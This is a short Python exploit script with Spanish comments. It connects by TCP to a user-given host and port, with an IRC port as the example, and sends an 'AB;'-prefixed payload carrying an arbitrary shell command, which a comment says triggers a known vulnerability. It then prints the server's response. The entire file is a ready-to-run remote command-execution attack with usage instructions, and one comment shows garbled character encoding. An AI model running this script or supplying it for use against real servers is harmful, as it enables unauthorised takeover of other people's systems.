import socket
import sys


def create_payload(command):
    # Formato espec√≠fico que activa la vulnerabilidad conocida
    return f"AB;{command}\n"


def connect_and_exploit(host, port, command):
    try:
        # Crear socket TCP
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print(f"[*] Conectando a {host}:{port}")
        sock.connect((host, port))

        # Enviar payload
        payload = create_payload(command)
        print(f"[*] Enviando comando: {command}")
        sock.send(payload.encode())

        # Recibir respuesta
        response = sock.recv(1024).decode()
        print("[*] Respuesta recibida:")
        print(response)

    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        sock.close()


def main():
    if len(sys.argv) != 4:
        print("Uso: python3 script.py <host> <port> <command>")
        print("Ejemplo: python3 script.py localhost 6667 whoami")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])
    command = sys.argv[3]

    connect_and_exploit(host, port, command)


if __name__ == "__main__":
    main()